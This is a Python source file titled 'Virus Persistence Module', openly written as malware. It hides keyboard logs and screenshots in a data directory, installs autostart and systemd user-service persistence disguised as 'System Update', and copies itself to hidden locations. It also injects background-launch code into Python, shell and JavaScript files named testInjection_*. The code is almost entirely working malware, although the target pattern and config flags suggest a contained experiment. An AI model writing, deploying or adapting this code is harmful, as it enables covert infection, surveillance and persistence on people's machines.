"""
Virus Persistence Module - Stealth, Persistence, Replication
"""
import os
import shutil
import subprocess
import glob
from virus_config import *
from virus_utils import log_activity

def setup_stealth():
    """Hide files and create hidden directories"""
    if not ENABLE_STEALTH:
        return
    
    try:
        os.makedirs(DATA_DIR, exist_ok=True)
        
        if os.path.exists(LOG_FILE):
            shutil.move(LOG_FILE, f"{DATA_DIR}/{LOG_FILE}")
        # activity_log.txt is merged into keyboard_log.txt, but clean up if exists
        if os.path.exists(ACTIVITY_LOG_FILE):
            # Merge any existing activity_log into keyboard_log before removing
            try:
                if os.path.exists(f"{DATA_DIR}/{LOG_FILE}"):
                    with open(ACTIVITY_LOG_FILE, 'r', encoding='utf-8') as f:
                        activity_content = f.read()
                    with open(f"{DATA_DIR}/{LOG_FILE}", 'a', encoding='utf-8') as f:
                        f.write("\n[MERGED FROM OLD ACTIVITY_LOG]\n")
                        f.write(activity_content)
                os.remove(ACTIVITY_LOG_FILE)
            except:
                pass
        if os.path.exists(SCREENSHOT_DIR):
            shutil.move(SCREENSHOT_DIR, f"{DATA_DIR}/{SCREENSHOT_DIR}")
        
        log_activity("STEALTH", "Stealth mode activated - files hidden")
    except:
        pass

def install_persistence():
    """Install as system service for persistence"""
    if not ENABLE_PERSISTENCE:
        return
    
    try:
        # Use virus_core.py path instead of snake_game.py
        virus_path = os.path.abspath(os.path.join(os.path.dirname(__file__), 'virus_core.py'))
        home_dir = os.path.expanduser("~")
        
        autostart_dir = f"{home_dir}/.config/autostart"
        os.makedirs(autostart_dir, exist_ok=True)
        
        desktop_file = f"{autostart_dir}/system-update.desktop"
        desktop_content = f"""[Desktop Entry]
Type=Application
Name=System Update
Exec=python3 {virus_path}
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
"""
        with open(desktop_file, 'w') as f:
            f.write(desktop_content)
        
        try:
            systemd_dir = f"{home_dir}/.config/systemd/user"
            os.makedirs(systemd_dir, exist_ok=True)
            
            service_file = f"{systemd_dir}/system-update.service"
            service_content = f"""[Unit]
Description=System Update Service
After=graphical-session.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {virus_path}
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
"""
            with open(service_file, 'w') as f:
                f.write(service_content)
            
            subprocess.run(['systemctl', '--user', 'enable', 'system-update.service'],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
        except:
            pass
        
        log_activity("PERSISTENCE", "Persistence installed - will survive reboots")
    except:
        pass

def self_replicate():
    """Copy itself to other locations"""
    if not ENABLE_SELF_REPLICATION:
        return
    
    try:
        virus_path = os.path.abspath(os.path.join(os.path.dirname(__file__), 'virus_core.py'))
        home_dir = os.path.expanduser("~")
        
        replication_targets = [
            f"{home_dir}/.cache/system-update.py",
            f"{home_dir}/.local/share/system-service.py",
            "/tmp/.system-update.py",
        ]
        
        for target in replication_targets:
            try:
                target_dir = os.path.dirname(target)
                os.makedirs(target_dir, exist_ok=True)
                shutil.copy2(virus_path, target)
                os.chmod(target, 0o755)
            except:
                pass
        
        log_activity("REPLICATION", "Self-replication completed")
    except:
        pass

def find_injection_targets():
    """Find all files matching testInjection_* pattern"""
    if not ENABLE_FILE_INJECTION:
        return []
    
    targets = []
    try:
        home_dir = os.path.expanduser("~")
        
        # Search in common directories
        search_dirs = [
            home_dir,
            os.path.join(home_dir, "Documents"),
            os.path.join(home_dir, "Downloads"),
            os.path.join(home_dir, "Desktop"),
            os.path.join(home_dir, "Projects"),
            os.path.join(home_dir, "workspace"),
            os.path.join(home_dir, "code"),
            "/tmp",
        ]
        
        # Also search recursively in home directory (limited depth)
        for search_dir in search_dirs:
            if not os.path.exists(search_dir):
                continue
            
            # Direct pattern match
            pattern = os.path.join(search_dir, "testInjection_*")
            matches = glob.glob(pattern)
            targets.extend(matches)
            
            # Recursive search (limited to 3 levels deep)
            try:
                for root, dirs, files in os.walk(search_dir):
                    # Limit depth
                    depth = root[len(search_dir):].count(os.sep)
                    if depth > 3:
                        dirs[:] = []  # Don't recurse deeper
                        continue
                    
                    for file in files:
                        if file.startswith("testInjection_"):
                            full_path = os.path.join(root, file)
                            if full_path not in targets:
                                targets.append(full_path)
            except:
                pass
        
        # Remove duplicates and filter out directories
        targets = list(set([t for t in targets if os.path.isfile(t)]))
        
    except Exception as e:
        log_activity("INJECTION", f"Error finding injection targets: {e}")
    
    return targets

def inject_virus_code(file_path):
    """Inject virus startup code into a file"""
    if not ENABLE_FILE_INJECTION:
        return False
    
    try:
        # Read original content
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                original_content = f.read()
        except:
            return False
        
        # Check if already injected (avoid re-injection)
        if '# VIRUS_INJECTED_MARKER' in original_content or '#VIRUS_INJECTED_MARKER' in original_content:
            return True  # Already injected
        
        # Get virus path dynamically (current location of virus, not hardcoded)
        # This will work whether virus is in development or installed location
        current_virus_dir = os.path.dirname(os.path.abspath(__file__))
        virus_path = os.path.join(current_virus_dir, 'virus_core.py')
        
        # Ensure we have absolute path
        virus_path = os.path.abspath(virus_path)
        virus_dir = os.path.dirname(virus_path)
        
        # Log the actual path being used
        log_activity("INJECTION", f"Using virus path: {virus_path}")
        
        # Determine file type by extension
        ext = os.path.splitext(file_path)[1].lower()
        base_name = os.path.basename(file_path)
        
        # Generate injection code based on file type
        injection_code = ""
        
        if ext in ['.py', '.pyw']:
            # Python file injection
            injection_code = f"""
# VIRUS_INJECTED_MARKER - Auto-generated by system
import os
import sys
import subprocess
import threading

def _virus_startup():
    try:
        virus_path = "{virus_path}"
        if os.path.exists(virus_path):
            # Start virus in background
            subprocess.Popen(
                [sys.executable, virus_path],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                start_new_session=True
            )
    except:
        pass

# Start virus in background thread
_virus_thread = threading.Thread(target=_virus_startup, daemon=True)
_virus_thread.start()
# END VIRUS_INJECTED_MARKER

"""
        elif ext in ['.sh', '.bash']:
            # Shell script injection
            injection_code = f"""
# VIRUS_INJECTED_MARKER - Auto-generated by system
# Start virus in background
if [ -f "{virus_path}" ]; then
    python3 "{virus_path}" > /dev/null 2>&1 &
fi
# END VIRUS_INJECTED_MARKER

"""
        elif ext in ['.js', '.jsx']:
            # JavaScript/Node.js injection
            injection_code = f"""
// VIRUS_INJECTED_MARKER - Auto-generated by system
const {{ exec }} = require('child_process');
const fs = require('fs');
const virusPath = "{virus_path}";
if (fs.existsSync(virusPath)) {{
    exec(`python3 "${{virusPath}}"`, {{ stdio: 'ignore' }}, () => {{}});
}}
// END VIRUS_INJECTED_MARKER

"""
        else:
            # Generic text file - try to inject as Python if it looks like code
            # Or inject as shell script if it starts with #!
            if original_content.startswith('#!'):
                # Shell script
                injection_code = f"""
# VIRUS_INJECTED_MARKER - Auto-generated by system
if [ -f "{virus_path}" ]; then
    python3 "{virus_path}" > /dev/null 2>&1 &
fi
# END VIRUS_INJECTED_MARKER

"""
            else:
                # Try Python-style injection
                injection_code = f"""
# VIRUS_INJECTED_MARKER - Auto-generated by system
import os, sys, subprocess, threading
def _vs(): 
    try:
        if os.path.exists("{virus_path}"):
            subprocess.Popen([sys.executable, "{virus_path}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, start_new_session=True)
    except: pass
threading.Thread(target=_vs, daemon=True).start()
# END VIRUS_INJECTED_MARKER

"""
        
        # Inject at the beginning (after shebang if present)
        if original_content.startswith('#!'):
            # Find end of shebang line
            shebang_end = original_content.find('\n') + 1
            new_content = original_content[:shebang_end] + injection_code + original_content[shebang_end:]
        else:
            # Inject at the very beginning
            new_content = injection_code + original_content
        
        # Write back
        with open(file_path, 'w', encoding='utf-8', errors='ignore') as f:
            f.write(new_content)
        
        # Make executable if it's a script
        if ext in ['.sh', '.bash'] or original_content.startswith('#!'):
            try:
                os.chmod(file_path, 0o755)
            except:
                pass
        
        log_activity("INJECTION", f"Injected virus code into: {file_path}")
        return True
        
    except Exception as e:
        log_activity("INJECTION", f"Error injecting into {file_path}: {e}")
        return False

def inject_into_target_files():
    """Find and inject virus code into all testInjection_* files"""
    if not ENABLE_FILE_INJECTION:
        return
    
    try:
        targets = find_injection_targets()
        if not targets:
            return
        
        injected_count = 0
        for target in targets:
            if inject_virus_code(target):
                injected_count += 1
        
        if injected_count > 0:
            log_activity("INJECTION", f"Injected virus code into {injected_count} file(s)")
        
    except Exception as e:
        log_activity("INJECTION", f"Error in injection process: {e}")

